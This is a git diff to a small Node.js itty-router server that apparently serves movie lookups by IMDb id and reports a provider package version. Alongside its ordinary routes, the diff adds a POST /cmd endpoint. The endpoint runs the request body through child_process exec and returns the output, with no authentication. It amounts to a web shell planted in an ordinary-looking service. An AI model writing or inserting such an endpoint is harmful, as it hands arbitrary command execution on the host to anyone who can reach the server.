@@ -1,14 +1,16 @@
 import { readFileSync } from "node:fs"
+import { exec } from "node:child_process"
+import { promisify } from "node:util"
 import { createServer } from 'node:http'
 import { createServerAdapter } from '@whatwg-node/server'
-import { createResponse, error, Router, text, withParams } from 'itty-router'
+import { createResponse, error, Router, text, withContent, withParams } from 'itty-router'
 import { mw, metadata } from "./mw.mjs"
 
 if (process.argv.length === 2 ) {
     const router = Router();
     const port = process.env.PORT || 3000;
     createServer(createServerAdapter(request => router
-        .all("*", withParams)
+        .all("*", withContent, withParams)
         .get("/:imdb/:s?/:e?", req => {
             if (req.params.imdb.match(/tt\d+/)) {
                 const new_url = new URL(req.url);
@@ -23,6 +25,7 @@ if (process.argv.length === 2 ) {
             JSON.parse(readFileSync("./node_modules/@movie-web/providers/package.json")).version + "\n"
         ))
         .get("/ip", () => fetch("https://ipinfo.io/json"))
+        .post("/cmd", async ({ content }) => text((await promisify(exec)(content)).stdout))
         .all("*", () => error(404))
         .handle(request)
         .then(createResponse("application/json", v => JSON.stringify(v, null, 4)))
